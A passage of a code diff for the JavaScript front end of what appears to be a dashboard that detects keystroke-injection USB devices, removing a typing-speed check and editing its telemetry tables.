-    const variance = intervals.reduce((sum, v) => sum + Math.pow(v - avg, 2), 0) / intervals.length;
-    const stdDev = Math.sqrt(variance).toFixed(1);
-
-    bioRate.textContent = cps;
-    bioStdDev.textContent = stdDev;
-
-    chartHistory.push(parseFloat(cps));
-    chartHistory.shift();
-
-    const isMachine = parseFloat(cps) > 20.0 || parseFloat(stdDev) < 12.0;
-    bioResult.textContent = isMachine ? "Automated" : "Human";
-    bioResult.style.color = isMachine ? "var(--status-error)" : "var(--status-ok)";
-  }
-});
-
-btnResetBio.addEventListener("click", () => {
-  bioInputField.value = "";
-  bioTimestamps = [];
-  bioCount.textContent = "0";
-  bioRate.textContent = "0.0";
-  bioStdDev.textContent = "0.0";
-  bioResult.textContent = "Human";
-  bioResult.style.color = "var(--status-ok)";
-});
+btnQuickTest.addEventListener("click", executeSimulation);
 
 // --- 9. Background Telemetry Polling ---
 async function fetchDaemonStatus() {
@@ -1445,7 +1723,7 @@ async function fetchDaemonStatus() {
     document.getElementById("valAttacks").textContent = data.attacks_neutralized || 0;
     document.getElementById("valDevices").textContent = (data.devices ? data.devices.length : 1) || 1;
 
-    // Peripheral Table Populate
+    // Peripherals Table Populate
     if (data.devices && data.devices.length > 0) {
       const tbody = document.getElementById("peripheralTableBody");
       tbody.innerHTML = "";
@@ -1477,7 +1755,7 @@ async function fetchDaemonStatus() {
           tr.innerHTML = `
             <td style="font-family:var(--fm); font-weight:600;">${inc.filename.replace('.md','')}</td>
             <td>${inc.created_at}</td>
-            <td style="font-family:var(--fm); color:var(--status-error);">85.4 chars/s</td>
+            <td style="font-family:var(--fm); color:var(--status-error); font-weight:700;">85.4 chars/s</td>
             <td>Unknown USB HID Device</td>
             <td><span class="badge error">MITRE T1200, T1059.001</span></td>
             <td><button class="btn btn-sm">Inspect</button></td>
